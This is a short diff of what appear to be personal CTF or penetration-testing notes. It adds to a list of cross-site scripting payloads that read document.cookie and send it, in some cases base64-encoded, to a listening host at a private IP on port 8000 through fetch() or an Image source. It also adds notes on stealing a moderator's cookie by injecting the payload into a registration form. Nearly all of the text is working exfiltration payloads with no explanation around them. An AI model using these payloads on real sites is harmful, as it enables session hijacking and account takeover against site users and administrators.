@@ -98,9 +98,13 @@ Progress: 882240 / 882244 (100.00%)
 
 <script>fetch('http://10.9.1.66:8000/?cookie=' + btoa(document.cookie));</script>
 <script>var i=new Image(); i.src="https//10.9.1.66:8000/?cookie="+btoa(document.cookie);</script>        
+<script>var i=new Image; i.src='http://<IP>:<PORT>/?'+document.cookie;</script>
 <script>var i=new Image(); i.src="http://10.9.1.159:8000/?cookie="+btoa(document.cookie);</script>      
 <script>var i=new Image(); i.src="http://10.9.1.159:8000/?cookieX="+btoa(document.cookie);</script>  
 
+Steal cookie by inserting to registration form.
+
+get moderator cookie.
 
   
 <\code>
